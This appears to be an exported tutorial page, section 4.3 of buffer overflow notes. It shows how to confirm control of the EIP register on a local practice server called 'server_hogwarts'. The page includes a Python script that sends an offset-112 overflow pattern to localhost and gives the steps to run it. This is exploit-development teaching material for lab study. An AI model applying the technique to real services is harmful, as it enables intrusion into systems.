<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>4.3 Buffer overflow: Controlling EIP</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>4.3 Buffer overflow: Controlling EIP</h1><br/><strong> </strong><br />EIP offset is the exact value that  gives us the information that how many bytes will fill the buffer and  overflow into the return address (EIP).<br />Controlling the EIP is a very crucial  part of buffer overflow attacks because EIP is the register that will  ultimately point to our malicious code so that it could be executed.  From the previous point we know the exact offset value is 112.<br /><br />On the Kali Machine let&#39;s create a Python script, to verify that we can control the wrote a Python script, to verify that we can control the EIP. . <br /><br />Script<br /><div class="codebox"><div class="codebox"><span style="color:#808080;font-weight:700">#!/usr/bin/python</span><br /><br /><span style="color:#007f1f;font-weight:400">import</span>&nbsp;sys,socket<br /><br />shellcode&nbsp;=&nbsp;<span style="color:#dd0000;font-weight:400">&#39;A&#39;</span>*<span style="color:#b07e00;font-weight:400">112</span>&nbsp;+&nbsp;<span style="color:#dd0000;font-weight:400">&#39;B&#39;</span>*<span style="color:#b07e00;font-weight:400">4</span>&nbsp;+&nbsp;<span style="color:#dd0000;font-weight:400">&quot;\x90&quot;</span>*<span style="color:#b07e00;font-weight:400">32</span>&nbsp;<span style="color:#808080;font-weight:400">#if&nbsp;done&nbsp;correctly,&nbsp;you&nbsp;should&nbsp;see&nbsp;the&nbsp;EIP&nbsp;filled&nbsp;with&nbsp;42424242</span><br /><br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />&nbsp;&nbsp;&nbsp;&nbsp;s.connect((<span style="color:#dd0000;font-weight:400">&#39;127.0.0.1&#39;</span>,<span style="color:#b07e00;font-weight:400">9898</span>))<br />&nbsp;&nbsp;&nbsp;&nbsp;s.send((shellcode))<br />&nbsp;&nbsp;&nbsp;&nbsp;s.close()<br /><br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;print(<span style="color:#dd0000;font-weight:400">&quot;Error&nbsp;connecting&nbsp;to&nbsp;server&quot;</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;&nbsp;&nbsp;&nbsp;</div></div><br /><br /><br />1. Create a file called “overwritingEIP.py” with the script and make it executable.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$nano</span>&nbsp;overwritingEIP.py<br /><span style="color:#0057ae;font-weight:400">$chmod</span>&nbsp;+x&nbsp;overwritingEIP.py</div></div><br />	<br />2. Run the “server_hogwarts” in a terminal.<br />	<div class="codebox"><div class="codebox">$./server_hogwarts</div></div><br />	<br />3. Run the payload created in another terminal.<br />	<div class="codebox"><div class="codebox">$./overwritingEIP.py</div></div><br />	<br />4. As we can see in the above image, the EIP register has “42424242”. The hexadecimal value of ASCII character “B” is 0x42. So, it is confirmed at this point that we can control the EIP register.<br /><br />	<span style="color:#ffa500;">Output:</span><br />	<a href=""><img src="images/510-1.png" alt="images/510-1.png" /></a><br />	<br />	<br /><strong>Note: After segmentation fault, the program is also killed. So, we have to run the server program every time it fails as in point 2.</strong><br /><br /><br /><strong>Warning: Don&#39;t close your “gdb” program.</strong><br /><br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>